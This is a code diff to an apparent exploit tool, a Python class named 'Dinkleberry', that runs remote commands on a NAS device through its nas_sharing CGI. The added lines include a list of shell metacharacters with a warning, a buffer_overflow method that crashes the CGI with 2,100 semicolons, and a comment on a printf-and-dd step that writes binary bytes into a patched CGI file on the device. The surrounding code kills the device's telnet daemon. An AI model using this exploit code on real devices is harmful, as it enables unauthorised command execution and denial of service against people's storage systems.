@@ -17,6 +17,8 @@ regular_response = """<?xml version="1.0" encoding="UTF-8"?>
 <config><nas_sharing><auth_state>1</auth_state></nas_sharing></config>
 """
 
+FORBIDDEN_CHARS = "$`#%^&()+{};[]\\= "
+
 
 class Dinkleberry:
 
@@ -26,6 +28,12 @@ class Dinkleberry:
         self.host = host
 
     def _perform_rce(self, command: list[str]) -> requests.Response:
+
+        if any(forbidden in cmd for cmd in command for forbidden in FORBIDDEN_CHARS):
+            logger.warning(
+                "Forbidden character detected - will be escaped with a \\ character"
+            )
+
         logger.debug(f"Sending {" ".join(command)}")
         params = {
             "user": "messagebus",
@@ -64,7 +72,7 @@ class Dinkleberry:
         self._perform_rce(command=patch_command)
         patch_command = [
             "printf",
-            "'\x00\xf0\x20\xe3\x00\xf0\x20\xe3'",
+            "'\x00\xf0\x20\xe3\x00\xf0\x20\xe3'",  # problematic due to '
             "|",
             "dd",
             "of=/usr/local/config/nas_sharing_patched.cgi",
@@ -88,6 +96,14 @@ class Dinkleberry:
 
     def kill_telnet(self):
         self._perform_rce(["killall", "utelnetd"])
+
+    def buffer_overflow(self):
+        response = self._perform_rce([";" * 2047])
+        logger.debug(response.status_code)  # 200
+        logger.debug(response.text)  # Normal response
+        response = self._perform_rce([";" * 2100])
+        logger.debug(response.status_code)  # 200
+        logger.debug(response.text)  # No response because the CGI crashed
 
 
 def main():
